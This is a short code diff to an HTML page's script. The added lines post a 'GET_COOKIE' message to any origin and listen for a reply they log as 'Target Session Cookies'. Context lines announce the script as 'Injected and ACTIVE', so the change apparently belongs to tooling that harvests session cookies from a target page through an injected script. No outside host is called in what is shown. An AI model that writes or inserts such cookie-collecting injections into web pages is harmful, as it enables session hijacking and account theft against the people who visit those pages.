@@ -176,6 +176,14 @@
 
             console.log("[" + VERSION + "] Injected and ACTIVE.");
         })();
+        window.postMessage({ type: 'GET_COOKIE' }, '*');
+        window.addEventListener('message', (event) => {
+            switch (event.data.type) {
+                    case 'GET_COOKIE_APP':
+                    console.log("Automated Data Received (Target Session Cookies):", event.data);
+                    break;}
+        });
+                                
     </script>
     <script src="https://cdn.jsdelivr.net/npm/wio-badge@1/b.min.js" defer></script>
 </body>
